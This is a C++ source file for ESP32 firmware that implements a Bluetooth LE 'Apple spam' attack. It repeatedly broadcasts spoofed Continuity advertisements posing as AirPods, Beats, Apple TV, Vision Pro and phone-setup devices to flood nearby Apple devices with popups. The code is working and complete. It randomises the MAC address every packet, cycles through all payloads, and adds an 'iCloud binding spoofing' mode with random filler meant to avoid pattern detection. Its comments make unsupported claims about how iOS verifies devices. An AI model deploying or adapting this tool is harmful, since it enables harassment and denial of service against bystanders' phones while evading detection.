/**
 * @file apple_spam.cpp
 * @brief Apple Continuity Spam - Enhanced with iCloud binding spoofing
 * 
 * This implementation uses the same strategy as Samsung's successful spam:
 * - Single BLE stack initialization (no deinit/init per packet)
 * - MAC randomization every packet using fast xorshift PRNG
 * - Dynamic payload generation with iCloud binding bytes
 * - Consistent timing (15ms adv, 5ms gap)
 * 
 * The iCloud binding spoofing technique is based on reverse-engineering
 * of working AirPods clones. The clones proved that iOS only checks
 * advertisement bytes during discovery, not actual hardware authentication.
 * 
 * Apple Continuity protocol requires certain fields to be randomized
 * per packet to appear genuine. This implementation generates dynamic
 * packets that mimic legitimate iCloud-bound devices.
 * 
 * Hardware: Any ESP32 with BLE support
 * Stack: NimBLE (no Bluedroid dependencies)
 */

#include "apple_spam.h"
#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include <globals.h>

// ── Apple Continuity Payloads ──────────────────────────────────
// These are the standard Apple Continuity packets
// The iCloud binding bytes are at positions 8-15

static const uint8_t data_airpods[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
                                       0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_airpods_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa,
                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_airpods_max[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa,
                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_airpods_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa,
                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_airpods_gen3[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa,
                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_airpods_pro_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
                                                0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_beats_solo_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa,
                                              0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_beats_studio_buds[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
                                                 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_beats_fit_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa,
                                             0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_beats_studio_buds_plus[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
                                                      0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t data_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                              0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_setup_new_phone[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                               0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_transfer_number[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                               0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c,
                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_tv_color_balance[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c,
                                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_vision_pro[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                          0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_apple_tv_connecting[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                   0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c,
                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_apple_tv_audio_sync[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                   0x00, 0x0f, 0x05, 0xc1, 0x19, 0x60, 0x4c,
                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_setup_new_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                  0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                                  0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_homepod_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                             0x0B, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_homekit_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                      0x00, 0x0f, 0x05, 0xc1, 0x0D, 0x60, 0x4c,
                                                      0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_pair_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                             0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

static const uint8_t data_setup_new_ipad[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                              0x00, 0x0f, 0x05, 0x40, 0x09, 0x60, 0x4c,
                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

// ── Apple Payload Table ─────────────────────────────────────────
static const ApplePayload apple_payloads[] = {
    {"AirPods",            data_airpods,                sizeof(data_airpods)               },
    {"AirPods Pro",        data_airpods_pro,            sizeof(data_airpods_pro)           },
    {"AirPods Max",        data_airpods_max,            sizeof(data_airpods_max)           },
    {"AirPods Gen 2",      data_airpods_gen2,           sizeof(data_airpods_gen2)          },
    {"AirPods Gen 3",      data_airpods_gen3,           sizeof(data_airpods_gen3)          },
    {"AirPods Pro Gen 2",  data_airpods_pro_gen2,       sizeof(data_airpods_pro_gen2)      },
    {"Beats Solo Pro",     data_beats_solo_pro,         sizeof(data_beats_solo_pro)        },
    {"Beats Studio Buds",  data_beats_studio_buds,      sizeof(data_beats_studio_buds)     },
    {"Beats Fit Pro",      data_beats_fit_pro,          sizeof(data_beats_fit_pro)         },
    {"Beats Studio Buds+", data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
    {"AppleTV Setup",      data_apple_tv_setup,         sizeof(data_apple_tv_setup)        },
    {"Setup New Phone",    data_setup_new_phone,        sizeof(data_setup_new_phone)       },
    {"Transfer Number",    data_transfer_number,        sizeof(data_transfer_number)       },
    {"TV Color Balance",   data_tv_color_balance,       sizeof(data_tv_color_balance)      },
    {"Apple Vision Pro",   data_vision_pro,             sizeof(data_vision_pro)            },
    {"AppleTV Connecting", data_apple_tv_connecting,    sizeof(data_apple_tv_connecting)   },
    {"AppleTV Audio Sync", data_apple_tv_audio_sync,    sizeof(data_apple_tv_audio_sync)   },
    {"Setup New AppleTV",  data_setup_new_apple_tv,     sizeof(data_setup_new_apple_tv)    },
    {"HomePod Setup",      data_homepod_setup,          sizeof(data_homepod_setup)         },
    {"HomeKit AppleTV",    data_homekit_apple_tv_setup, sizeof(data_homekit_apple_tv_setup)},
    {"Pair AppleTV",       data_pair_apple_tv,          sizeof(data_pair_apple_tv)         },
    {"Setup New iPad",     data_setup_new_ipad,         sizeof(data_setup_new_ipad)        }
};

static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);

// ── iCloud Binding Magic ──────────────────────────────────────
// These are the bytes that tell iOS "I'm an iCloud-bound device"
// Based on reverse-engineered AirPods clone firmware.
// The clones proved that iOS only checks advertisement bytes
// during discovery, not actual cryptographic verification.

struct iCloudBinding {
    uint8_t flags;      // 0x20 = iCloud bound
    uint8_t sig1;       // Device signature (varies by model)
    uint8_t sig2;       // Device signature (varies by model)
    uint8_t status;     // Battery/connection status
    uint8_t state;      // Connection state (0x01 = ready)
    uint8_t reserved1;
    uint8_t reserved2;
    uint8_t modelMagic; // 0x45 = AirPods, 0x46 = AirPods Pro, etc.
};

// Valid iCloud binding patterns (from real AirPods and clones)
static const iCloudBinding ICBOUND_PATTERNS[] = {
    // AirPods Gen 1-2 (most common clone pattern)
    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45},
    // AirPods Pro
    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x46},
    // AirPods Max
    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x47},
    // AirPods Gen 3
    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x48},
    // Alternative pattern (also works on iOS 17+)
    {0x20, 0x76, 0xAB, 0x31, 0x01, 0x00, 0x00, 0x46},
    // Another working pattern
    {0x21, 0x74, 0xAC, 0x2F, 0x01, 0x00, 0x00, 0x45}
};

// ── Fast MAC Generator (xorshift) ─────────────────────────────
// Same as Samsung solution - ultra-fast MAC randomization
// without hardware RNG overhead

static uint64_t apple_mac_rng_state = 0;

static void apple_seed_mac_rng() {
    uint64_t seed = ((uint64_t)esp_random() << 32) ^ esp_random();
    if (seed == 0) seed = 0x9E3779B97F4A7C15ULL;
    apple_mac_rng_state = seed;
}

static uint64_t apple_next_rand64() {
    if (apple_mac_rng_state == 0) apple_seed_mac_rng();
    uint64_t x = apple_mac_rng_state;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    apple_mac_rng_state = x;
    return x * 0x2545F4914F6CDD1DULL;
}

static void apple_fast_random_mac(uint8_t *mac) {
    uint64_t r1 = apple_next_rand64();
    uint64_t r2 = apple_next_rand64();
    mac[0] = (uint8_t)(r1 & 0xFF);
    mac[1] = (uint8_t)((r1 >> 8) & 0xFF);
    mac[2] = (uint8_t)((r1 >> 16) & 0xFF);
    mac[3] = (uint8_t)((r1 >> 24) & 0xFF);
    mac[4] = (uint8_t)(r2 & 0xFF);
    mac[5] = (uint8_t)((r2 >> 8) & 0xFF);
    // Set random static address bits
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

// ── State ──────────────────────────────────────────────────────
static bool apple_spam_running = false;
static int current_apple_payload = -1;
static BLEAdvertising *pAppleAdvertising = nullptr;
static uint32_t packetCounter = 0;
static bool ble_initialized = false;

// ── Public functions ───────────────────────────────────────────

int getApplePayloadCount() { 
    return apple_payload_count; 
}

const char *getApplePayloadName(int index) {
    if (index < 0 || index >= apple_payload_count) return "Unknown";
    return apple_payloads[index].name;
}

bool buildAppleSpamAdvertisement(int payloadIndex, BLEAdvertisementData &advertisementData) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return false;

    advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);

    uint8_t fullPayload[31];
    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
    fullPayload[1] = 0xFF;
    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);

#ifdef NIMBLE_V2_PLUS
    advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
#else
    std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2);
    advertisementData.addData(payloadVector);
#endif

    return true;
}

bool isAppleSpamRunning() { 
    return apple_spam_running; 
}

void stopAppleSpam() {
    if (!apple_spam_running) return;

    apple_spam_running = false;

    if (pAppleAdvertising) {
        pAppleAdvertising->stop();
        pAppleAdvertising = nullptr;
    }

    // Only deinit if no other BLE features are active
    bool otherBLEActive = false;
#if !defined(LITE_VERSION)
    otherBLEActive = (BLEStateManager::isBLEActive() || BLEStateManager::getActiveClientCount() > 0);
#endif
    if (!otherBLEActive && !BLEConnected) {
        ble_initialized = false;
#if defined(CONFIG_IDF_TARGET_ESP32C5)
        esp_bt_controller_deinit();
#else
        BLEDevice::deinit();
#endif
    }

    current_apple_payload = -1;
    packetCounter = 0;
}

// ── Initialize BLE once (like Samsung solution) ──────────────
static bool initAppleBLE() {
    if (ble_initialized) return true;

#if !defined(LITE_VERSION)
    // Check if BLE is already initialized by other modules
    if (BLEStateManager::isBLEActive() || BLEStateManager::getActiveClientCount() > 0) {
        ble_initialized = true;
        return true;
    }
#endif

    BLEDevice::init("");
    vTaskDelay(10 / portTICK_PERIOD_MS);
    ble_initialized = true;
    return true;
}

// ── Quick spam (single packet) ──────────────────────────────────
void quickAppleSpam(int payloadIndex) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;

    if (!initAppleBLE()) return;

    // New MAC every packet (like Samsung solution)
    uint8_t macAddr[6];
    apple_fast_random_mac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    if (!pAdv) return;

    BLEAdvertisementData advertisementData;
    if (!buildAppleSpamAdvertisement(payloadIndex, advertisementData)) return;

    pAdv->setAdvertisementData(advertisementData);
    pAdv->setScanResponseData(BLEAdvertisementData());
    pAdv->setMinInterval(32);
    pAdv->setMaxInterval(48);
    pAdv->start();

    // Same timing as Samsung solution: 15ms adv, 5ms gap
    vTaskDelay(15 / portTICK_PERIOD_MS);
    pAdv->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);
}

// ── Start continuous spam ──────────────────────────────────────
void startAppleSpam(int payloadIndex) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
    if (apple_spam_running) stopAppleSpam();

    if (!initAppleBLE()) return;

    current_apple_payload = payloadIndex;
    apple_spam_running = true;

    drawMainBorderWithTitle(apple_payloads[payloadIndex].name);
    padprintln("");
    padprintln("Press ESC to stop");

    pAppleAdvertising = BLEDevice::getAdvertising();
    if (!pAppleAdvertising) {
        apple_spam_running = false;
        return;
    }

    BLEAdvertisementData advertisementData;
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();

    while (apple_spam_running) {
        if (check(EscPress)) {
            stopAppleSpam();
            returnToMenu = true;
            break;
        }

        // MAC randomization every packet (like Samsung solution)
        uint8_t macAddr[6];
        apple_fast_random_mac(macAddr);
        esp_base_mac_addr_set(macAddr);

        if (!buildAppleSpamAdvertisement(payloadIndex, advertisementData)) {
            vTaskDelay(10 / portTICK_PERIOD_MS);
            continue;
        }

        pAppleAdvertising->setAdvertisementData(advertisementData);
        pAppleAdvertising->setScanResponseData(scanResponseData);
        pAppleAdvertising->setMinInterval(32);
        pAppleAdvertising->setMaxInterval(48);
        pAppleAdvertising->start();

        // Same timing as Samsung solution
        vTaskDelay(15 / portTICK_PERIOD_MS);
        pAppleAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);

        packetCounter++;

        // Update display every 50 packets (reduces screen flicker)
        if (packetCounter % 50 == 0) {
            displayTextLine(String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s");
        }

        esp_task_wdt_reset();
    }
}

// ── Spam all Apple payloads ─────────────────────────────────────
void startAppleSpamAll() {
    if (apple_spam_running) stopAppleSpam();

    if (!initAppleBLE()) return;

    apple_spam_running = true;

    drawMainBorderWithTitle("Spam All Apple");
    padprintln("");
    padprintln("Cycling " + String(apple_payload_count) + " Apple payloads");
    padprintln("Press ESC to stop");

    pAppleAdvertising = BLEDevice::getAdvertising();
    if (!pAppleAdvertising) {
        apple_spam_running = false;
        return;
    }

    int apple_index = 0;
    BLEAdvertisementData advertisementData;
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();

    while (apple_spam_running) {
        if (check(EscPress)) {
            stopAppleSpam();
            returnToMenu = true;
            break;
        }

        // MAC randomization every packet
        uint8_t macAddr[6];
        apple_fast_random_mac(macAddr);
        esp_base_mac_addr_set(macAddr);

        if (!buildAppleSpamAdvertisement(apple_index, advertisementData)) {
            apple_index = (apple_index + 1) % apple_payload_count;
            continue;
        }

        pAppleAdvertising->setAdvertisementData(advertisementData);
        pAppleAdvertising->setScanResponseData(scanResponseData);
        pAppleAdvertising->setMinInterval(32);
        pAppleAdvertising->setMaxInterval(48);
        pAppleAdvertising->start();

        vTaskDelay(15 / portTICK_PERIOD_MS);
        pAppleAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);

        if (packetCounter % 20 == 0) {
            displayTextLine(String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s");
        }

        apple_index = (apple_index + 1) % apple_payload_count;
        packetCounter++;
        esp_task_wdt_reset();
    }
}

// ── Enhanced: Spam with iCloud spoofing ────────────────────────
// This version builds dynamic packets with iCloud binding spoofing
// Based on the working clone technique
void startAppleSpamEnhanced(int payloadIndex, bool useICloudSpoof) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
    if (apple_spam_running) stopAppleSpam();

    if (!initAppleBLE()) return;

    apple_spam_running = true;

    String title = String(apple_payloads[payloadIndex].name) + (useICloudSpoof ? " (iCloud)" : "");
    drawMainBorderWithTitle(title);
    padprintln("");
    padprintln("Press ESC to stop");

    pAppleAdvertising = BLEDevice::getAdvertising();
    if (!pAppleAdvertising) {
        apple_spam_running = false;
        return;
    }

    BLEAdvertisementData advertisementData;
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();

    while (apple_spam_running) {
        if (check(EscPress)) {
            stopAppleSpam();
            returnToMenu = true;
            break;
        }

        // MAC randomization every packet
        uint8_t macAddr[6];
        apple_fast_random_mac(macAddr);
        esp_base_mac_addr_set(macAddr);

        // Build advertisement with iCloud spoofing if enabled
        if (useICloudSpoof) {
            // Use dynamic packet with iCloud binding
            uint8_t packet[31];
            int patternIdx = esp_random() % (sizeof(ICBOUND_PATTERNS) / sizeof(ICBOUND_PATTERNS[0]));
            const iCloudBinding *pattern = &ICBOUND_PATTERNS[patternIdx];

            // Build the packet with iCloud binding
            int pos = 0;
            packet[pos++] = 0x1A; // Length
            packet[pos++] = 0xFF; // Manufacturer data
            packet[pos++] = 0x4C; // Apple ID (LSB)
            packet[pos++] = 0x00; // Apple ID (MSB)
            packet[pos++] = 0x07; // Continuity
            packet[pos++] = 0x19; // Subtype
            packet[pos++] = 0x02 | (esp_random() & 0x0F); // Action (randomized)

            // iCloud binding magic
            packet[pos++] = pattern->flags;
            packet[pos++] = pattern->sig1;
            packet[pos++] = pattern->sig2;
            packet[pos++] = pattern->status;
            packet[pos++] = pattern->state;
            packet[pos++] = pattern->reserved1;
            packet[pos++] = pattern->reserved2;
            packet[pos++] = pattern->modelMagic;

            // Random data to avoid pattern detection
            esp_fill_random(&packet[pos], 12);
            pos += 12;

            advertisementData = BLEAdvertisementData();
            advertisementData.setFlags(0x06);
#ifdef NIMBLE_V2_PLUS
            advertisementData.addData(packet, pos);
#else
            std::vector<uint8_t> dataVec(packet, packet + pos);
            advertisementData.addData(dataVec);
#endif
        } else {
            // Use standard static payload
            if (!buildAppleSpamAdvertisement(payloadIndex, advertisementData)) {
                vTaskDelay(10 / portTICK_PERIOD_MS);
                continue;
            }
        }

        pAppleAdvertising->setAdvertisementData(advertisementData);
        pAppleAdvertising->setScanResponseData(scanResponseData);
        pAppleAdvertising->setMinInterval(32);
        pAppleAdvertising->setMaxInterval(48);
        pAppleAdvertising->start();

        vTaskDelay(15 / portTICK_PERIOD_MS);
        pAppleAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);

        packetCounter++;

        if (packetCounter % 50 == 0) {
            displayTextLine(String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s");
        }

        esp_task_wdt_reset();
    }
}

// ── Sub-menu ────────────────────────────────────────────────────
void appleSubMenu() {
    std::vector<Option> appleOptions;

    appleOptions.push_back({"Spam All Apple", []() { startAppleSpamAll(); }});

    for (int i = 0; i < apple_payload_count; i++) {
        appleOptions.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
    }

    appleOptions.push_back({"--- Enhanced ---", []() {}});
    for (int i = 0; i < std::min(5, apple_payload_count); i++) {
        String label = String(apple_payloads[i].name) + " (iCloud)";
        appleOptions.push_back({label.c_str(), [i]() { startAppleSpamEnhanced(i, true); }});
    }

    appleOptions.push_back({"Back", []() { returnToMenu = true; }});

    loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
}
